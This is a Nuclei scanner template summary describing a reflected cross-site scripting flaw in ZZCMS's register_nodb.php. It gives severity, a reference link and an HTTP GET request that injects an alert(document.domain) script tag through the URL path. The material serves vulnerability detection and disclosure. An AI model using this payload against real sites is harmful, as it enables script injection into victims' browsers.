# Nuclei Template: Zzcms `register_nodb.php` - Cross Site Scripting
**Template ID:** zzcms-register-xss
**Vulnerability Class:** Cross-site Scripting (XSS) - Generic
**Severity:** Medium
**Source:** Nuclei Template (`zzcms-register-xss.yaml`)

## Vulnerability Information & PoC

## Description
Identified a reflected Cross-Site Scripting (XSS) vulnerability in register_nodb.php of ZZCMS, which allowed injection of malicious scripts via user-supplied input.

## Steps to reproduce / Exploit Payload
```http
GET {{BaseURL}}/3/ucenter_api/code/register_nodb.php/"><script>alert(document.domain)</script>
```

## References
- https://github.com/Sinon2003/cve/blob/main/zzcms/xss-register_nodb.php.md
